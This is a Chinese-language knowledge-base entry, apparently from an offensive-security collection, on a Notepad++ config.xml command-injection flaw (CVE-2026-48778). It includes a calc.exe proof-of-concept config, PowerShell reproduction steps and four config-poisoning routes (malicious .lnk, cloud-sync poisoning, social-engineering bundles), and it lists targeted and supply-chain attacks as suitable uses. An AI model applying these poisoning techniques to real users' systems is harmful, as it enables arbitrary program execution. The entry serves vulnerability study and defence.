---
id: "windows/notepadpp-config-injection"
title: "Notepad++ config.xml 命令注入（CVE-2026-48778）"
title_en: "Notepad++ config.xml Command Injection (CVE-2026-48778)"
summary: >
  Notepad++ v8.9.6及之前版本的config.xml中commandLineInterpreter字段未做白名单校验，攻击者可通过直接写入、恶意.lnk、云同步投毒或社工打包等方式污染配置文件，在受害者执行菜单操作时实现任意程序执行。
summary_en: >
  In Notepad++ ≤v8.9.6, the commandLineInterpreter field in config.xml lacks whitelist validation. Attackers can poison the config via direct write, malicious .lnk, cloud sync poisoning, or social-engineering bundles, achieving arbitrary program execution when the victim triggers a menu action.
board: "windows"
category: "techniques"
signals:
  - "Notepad++"
  - "config.xml"
  - "命令注入"
  - "command injection"
  - "CVE-2026-48778"
  - "配置污染"
  - "configuration poisoning"
  - "ShellExecute"
mcp_tools:
  - "kb_router"
  - "workspace_write_text"
keywords:
  - "Notepad++"
  - "CVE-2026-48778"
  - "config.xml"
  - "command injection"
  - "RCE"
  - "configuration poisoning"
  - "ShellExecute"
  - "GHSA-7hm3-wp5q-ccv9"
  - "社工"
  - "供应链攻击"
difficulty: "beginner"
tags:
  - "CVE"
  - "RCE"
  - "configuration"
  - "Notepad++"
  - "command-injection"
  - "GHSA"
  - "config-poisoning"
language: "zh-CN"
last_updated: "2026-06-25"
related_articles: []
---
# Notepad++ config.xml 命令注入（CVE-2026-48778）

## 1. 受影响版本

Notepad++ `<= v8.9.6`。修复版本：v8.9.6.1（commit `24c7b5c63ce`）。GHSA: `GHSA-7hm3-wp5q-ccv9`。

## 2. 根因：配置信任边界失效

Notepad++ 启动时读取 `config.xml` 中的 `commandLineInterpreter` 字段，**不做白名单校验和路径合法性验证**：

```xml
<!-- 正常 -->
<GUIConfig name="commandLineInterpreter">cmd.exe</GUIConfig>

<!-- 恶意 -->
<GUIConfig name="commandLineInterpreter">calc.exe</GUIConfig>
```

用户执行「文件 → 打开所在文件夹 → cmd」时，Notepad++ 用该字段构造 `Command` 对象并调用 `ShellExecute()` → 执行被篡改后的程序。

## 3. 调用链

```
攻击者准备 malicious_config.xml
    → 将 commandLineInterpreter 替换为任意程序路径
    → 写入目标用户 %APPDATA%\Notepad++\config.xml
    → 或通过 -settingsDir= 指向攻击者控制目录
    → 或通过云同步/社工投毒配置文件
    ↓
用户打开 Notepad++，打开文件
    → 执行「文件 → 打开所在文件夹 → cmd」
    → Notepad++ 从 config.xml 读取 commandLineInterpreter
    → 无白名单校验
    → ShellExecute(被篡改后的程序路径)
    → 执行任意程序
```

## 4. 配置污染路径

| 方式 | 说明 |
|------|------|
| 直接写入 | 修改 `%APPDATA%\Notepad++\config.xml` |
| 恶意 `.lnk` | `-settingsDir=` 指向攻击者控制目录 |
| 云同步投毒 | 污染 OneDrive / Dropbox 同步路径下的配置文件 |
| 社工打包 | 诱导解压并替换配置文件 |

## 5. PoC

```xml
<?xml version="1.0" encoding="UTF-8"?>
<NotepadPlus>
    <GUIConfigs>
        <GUIConfig name="commandLineInterpreter">calc.exe</GUIConfig>
    </GUIConfigs>
</NotepadPlus>
```

触发操作：
1. 将上述内容写入 `%APPDATA%\Notepad++\config.xml`
2. 打开 Notepad++，打开任意文件
3. 执行 `文件 → 打开所在文件夹 → cmd`
4. 弹出 calc.exe（而非 cmd.exe）

## 6. 复现

```powershell
# 备份原始配置
copy "$env:APPDATA\Notepad++\config.xml" "$env:APPDATA\Notepad++\config.xml.bak"

# 写入恶意配置后，打开 Notepad++ 执行菜单操作即可验证
```

### 使用 -settingsDir（不污染默认配置）

```powershell
notepad++.exe -settingsDir="C:\attacker\settings"
# 在该目录下放置恶意 config.xml
```

## 7. 攻击面

| 维度 | 说明 |
|------|------|
| 攻击入口 | 本地配置污染（非远程触发） |
| 用户交互 | 需要用户执行常规菜单操作 |
| 隐蔽性 | 高：配置文件本身不显眼 |
| 稳定性 | 高：不依赖内存破坏 |
| 适合场景 | 定向攻击、内部渗透、社工、供应链污染 |

## Evidence

记录: config.xml 修改前后 diff、ShellExecute 目标进程、触发操作的菜单路径

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 知识检索 | `kb_router` | 按 Notepad++ / 配置注入信号搜索 |
| 写分析笔记 | `workspace_write_text` | 记录配置检查结果 |

## 参考资料

| 来源 | 链接 |
|------|------|
| GHSA | https://github.com/notepad-plus-plus/notepad-plus-plus/security/advisories/GHSA-7hm3-wp5q-ccv9 |
| 修复版本公告 | https://notepad-plus-plus.org/news/v8961-released/ |
| 修复提交 | https://github.com/notepad-plus-plus/notepad-plus-plus/commit/24c7b5c63cece76dbc8c4f2607a27ebfe22fa614 |
| Qualys 分析 | https://threatprotect.qualys.com/2026/05/29/notepad-vulnerabilities-allow-attackers-to-execute-arbitrary-code-cve-2026-48778/ |
| poc-lab 源 | https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-48778%20Notepad%2B%2B%20RCE |
